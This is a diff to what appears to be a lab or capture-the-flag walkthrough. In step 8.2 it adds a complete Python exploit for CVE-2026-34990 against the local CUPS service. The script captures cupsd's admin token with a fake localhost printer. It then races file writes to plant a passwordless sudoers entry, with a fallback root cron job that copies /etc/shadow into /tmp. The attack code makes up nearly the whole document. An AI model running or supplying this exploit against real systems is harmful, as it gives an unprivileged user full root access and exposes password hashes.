@@ -1540,7 +1540,7 @@ Key findings:
 <br>
 </div>
 
-### 8.2 Stage the exploit script on the target
+### 8.2 Stage the exploit script on the target & Exploit CVE-2026-34990 to write a root-owned sudoers fragment
 
 **Why this step:** CVE-2026-34990 is a local attack against `127.0.0.1:631`, so the exploit must run on the portal itself as aporter, not from Kali. The script is created directly on the target with `vi` to avoid transfer dependencies and paste-mangling.
 
@@ -1550,9 +1550,181 @@ Key findings:
 vi cups_root.py
 ```
 
-```
-cups_root.py  user.txt        # file present in aporter's home
-syntax OK                     # (py_compile parse succeeds)
+```python
+#!/usr/bin/env python3
+"""CVE-2026-34990 -> root. Run ON THE VICTIM as the unprivileged user (aporter).
+Captures cupsd's Local admin token via a fake localhost IPP printer, then races
+a temporary file:// queue into persistence and prints our payload into it
+(root file overwrite). Stage 1: /etc/sudoers.d fragment. Stage 2: /etc/cron.d."""
+import gzip, os, socket, struct, subprocess, sys, threading, time
+ATTACKER = sys.argv[1] if len(sys.argv) > 1 else "aporter"
+CAPTURE_HOST, CAPTURE_PORT = "127.0.0.1", 9189
+IPP_HOST, IPP_PORT = "127.0.0.1", 631
+T_OP, T_PRINTER, T_END = 0x01, 0x04, 0x03
+T_INT, T_BOOL, T_NAME, T_KEYWORD = 0x21, 0x22, 0x42, 0x44
+T_URI, T_CHARSET, T_LANG, T_MIME = 0x45, 0x47, 0x48, 0x49
+OP_PRINT_JOB, OP_RESUME = 0x0002, 0x0011
+OP_ADDMOD, OP_ACCEPT, OP_CREATE_LOCAL, OP_DELETE = 0x4003, 0x4008, 0x4028, 0x4004
+def a(tag, name, val):
+    n, v = name.encode(), val.encode()
+    return bytes([tag]) + struct.pack(">H", len(n)) + n + struct.pack(">H", len(v)) + v
+def a_raw(tag, name, v):
+    n = name.encode()
+    return bytes([tag]) + struct.pack(">H", len(n)) + n + struct.pack(">H", len(v)) + v
+def ab(name, val):  return a_raw(T_BOOL, name, b"\x01" if val else b"\x00")
+def req(op, rid, oa, pa=None, doc=b""):
+    p = bytearray(struct.pack(">BBHI", 2, 0, op, rid)); p.append(T_OP)
+    for x in oa: p.extend(x)
+    if pa:
+        p.append(T_PRINTER)
+        for x in pa: p.extend(x)
+    p.append(T_END); p.extend(doc)
+    return bytes(p)
+def post(res, body, auth=None, timeout=4.0):
+    h = [f"POST {res} HTTP/1.1", f"Host: {IPP_HOST}:{IPP_PORT}",
+         "Content-Type: application/ipp", f"Content-Length: {len(body)}", "Connection: close"]
+    if auth: h.append(f"Authorization: Local {auth}")
+    raw = ("\r\n".join(h) + "\r\n\r\n").encode("latin1") + body
+    with socket.create_connection((IPP_HOST, IPP_PORT), timeout=timeout) as s:
+        s.settimeout(timeout); s.sendall(raw)
+        buf = bytearray()
+        while b"\r\n\r\n" not in buf:
+            c = s.recv(65536)
+            if not c: break
+            buf.extend(c)
+        hh, _, rest = bytes(buf).partition(b"\r\n\r\n")
+        cl = 0
+        for ln in hh.split(b"\r\n"):
+            if ln.lower().startswith(b"content-length:"):
+                cl = int(ln.split(b":", 1)[1].strip())
+        pl = bytearray(rest)
+        while len(pl) < cl:
+            c = s.recv(65536)
+            if not c: break
+            pl.extend(c)
+        sl = hh.split(b"\r\n", 1)[0].split()
+        return (int(sl[1]) if len(sl) > 1 else 0), bytes(pl[:cl] if cl else pl)
+def st(p): return struct.unpack(">H", p[2:4])[0] if len(p) >= 4 else -1
+def common():
+    return [a(T_CHARSET, "attributes-charset", "utf-8"),
+            a(T_LANG, "attributes-natural-language", "en"),
+            a(T_NAME, "requesting-user-name", ATTACKER)]
+def admin(tok, op, rid, name, pa=None):
+    c, p = post("/admin/", req(op, rid, common() +
+                [a(T_URI, "printer-uri", f"ipp://localhost:631/printers/{name}")], pa), auth=tok)
+    return c, st(p)
+def print_job(name, rid, payload):
+    c, p = post(f"/printers/{name}", req(OP_PRINT_JOB, rid,
+                common() + [a(T_URI, "printer-uri", f"ipp://localhost:631/printers/{name}"),
+                            a(T_MIME, "document-format", "application/vnd.cups-raw"),
+                            a(T_KEYWORD, "compression", "gzip"),
+                            a(T_NAME, "job-name", "pwn")], doc=gzip.compress(payload)))
+    return c, st(p)
+def create_local(sock_holder, name, target, rid):
+    body = req(OP_CREATE_LOCAL, rid, common() + [a(T_URI, "printer-uri", "ipp://localhost:631/")],
+               [a(T_NAME, "printer-name", name), a(T_URI, "device-uri", f"file://{target}")])
+    raw = (f"POST / HTTP/1.1\r\nHost: {IPP_HOST}:{IPP_PORT}\r\nContent-Type: application/ipp\r\n"
+           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode("latin1") + body
+    sk = socket.create_connection((IPP_HOST, IPP_PORT), timeout=4)
+    sk.sendall(raw); sock_holder.append(sk)
+    return sk
+class Cap(threading.Thread):
+    def __init__(self, port):
+        super().__init__(daemon=True); self.port, self.token = port, None
+    def run(self):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.bind((CAPTURE_HOST, self.port)); s.listen(5); s.settimeout(0.2)
+            end = time.time() + 12
+            while time.time() < end and not self.token:
+                try: c, _ = s.accept()
+                except socket.timeout: continue
+                with c:
+                    d = b""; c.settimeout(5)
+                    while b"\r\n\r\n" not in d:
+                        x = c.recv(4096)
+                        if not x: break
+                        d += x
+                    tok = None
+                    for ln in d.decode("latin1", "replace").splitlines():
+                        if ln.lower().startswith("authorization: local "):
+                            tok = ln.split(None, 2)[2]
+                    if tok:
+                        self.token = tok
+                        ipp = (b"\x02\x00\x00\x00\x00\x00\x00\x01\x01"
+                               b"\x47\x00\x12attributes-charset\x00\x05utf-8"
+                               b"\x48\x00\x1battributes-natural-language\x00\x02en\x03")
+                        c.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: application/ipp\r\nContent-Length: "
+                                  + str(len(ipp)).encode() + b"\r\nConnection: close\r\n\r\n" + ipp)
+                    else:
+                        c.sendall(b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Local trc=\"y\"\r\n"
+                                  b"Content-Length: 0\r\nConnection: close\r\n\r\n")
+def race_write(tok, name, payload, seconds=6.0):
+    rid = 0; end = time.time() + seconds
+    while time.time() < end:
+        rid += 1
+        admin(tok, OP_ADDMOD, 1000 + rid, name,
+              [a(T_NAME, "ppd-name", "raw"), ab("printer-is-shared", True)])
+        admin(tok, OP_ACCEPT, 2000 + rid, name)
+        admin(tok, OP_RESUME, 3000 + rid, name)
+        hc, hs = print_job(name, 4000 + rid, payload)
+        if hc == 200 and hs in (0x0000, 0x0001):
+            return True
+        time.sleep(0.05)
+    return False
+def is_root():
+    r = subprocess.run(["sudo", "-n", "/bin/sh", "-c", "id"], capture_output=True, text=True)
+    return r.returncode == 0, (r.stdout + r.stderr).strip()
+def stage(tok, tag, path, payload, tries=12):
+    for i in range(tries):
+        name = f"{tag}{i}{time.time_ns() % 100000}"
+        holder = []
+        create_local(holder, name, path, 7000 + i)
+        won = race_write(tok, name, payload)
+        for sk in holder:
+            try: sk.close()
+            except Exception: pass
+        print(f"    [{tag}] attempt {i}: race={'won' if won else 'lost'}", flush=True)
+        if os.path.exists(path):
+            admin(tok, OP_DELETE, 9000 + i, name)
+            return True
+        time.sleep(0.3)
+    return False
+def main():
+    cap = Cap(CAPTURE_PORT); cap.start(); time.sleep(0.4)
+    body = req(OP_CREATE_LOCAL, 3, common() + [a(T_URI, "printer-uri", "ipp://localhost:631/")],
+               [a(T_NAME, "printer-name", "tokenleak"),
+                a(T_URI, "device-uri", f"ipp://{CAPTURE_HOST}:{CAPTURE_PORT}/ipp/print")])
+    raw = (f"POST / HTTP/1.1\r\nHost: {IPP_HOST}:{IPP_PORT}\r\nContent-Type: application/ipp\r\n"
+           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode("latin1") + body
+    s = socket.create_connection((IPP_HOST, IPP_PORT), timeout=4); s.sendall(raw)
+    s.settimeout(2)
+    try: s.recv(4096)
+    except Exception: pass
+    s.close(); cap.join(timeout=12)
+    if not cap.token:
+        print("[-] no token captured"); return 1
+    print("[+] Local token:", cap.token, flush=True)
+    print("[*] stage 1: /etc/sudoers.d fragment", flush=True)
+    if stage(cap.token, "sw", f"/etc/sudoers.d/{ATTACKER}-pwn",
+             f"{ATTACKER} ALL=(ALL) NOPASSWD: ALL\n".encode()):
+        ok, out = is_root(); print(f"[*] sudo -n id -> {out}", flush=True)
+        if ok:
+            print("[+] ROOT via sudoers"); return 0
+    print("[*] stage 2: /etc/cron.d fallback", flush=True)
+    if stage(cap.token, "cw", f"/etc/cron.d/{ATTACKER}-pwn",
+             f"* * * * * root cp /etc/shadow /tmp/shadow-{ATTACKER};"
+             f" chmod 644 /tmp/shadow-{ATTACKER}\n".encode()):
+        for _ in range(90):
+            ok, out = is_root()
+            if ok: print("[+] ROOT via cron"); return 0
+            if os.path.exists(f"/tmp/shadow-{ATTACKER}"):
+                print(f"[+] cron ran (see /tmp/shadow-{ATTACKER}); john it or reuse stage 1")
+                return 0
+            time.sleep(1)
+    print("[-] no root yet"); return 1
+if __name__ == "__main__":
+    sys.exit(main())
 ```
 
 **What this gives you:** Key finding: the CVE-2026-34990 exploit is staged on the portal as `cups_root.py` and verified syntactically intact, ready to run as aporter.
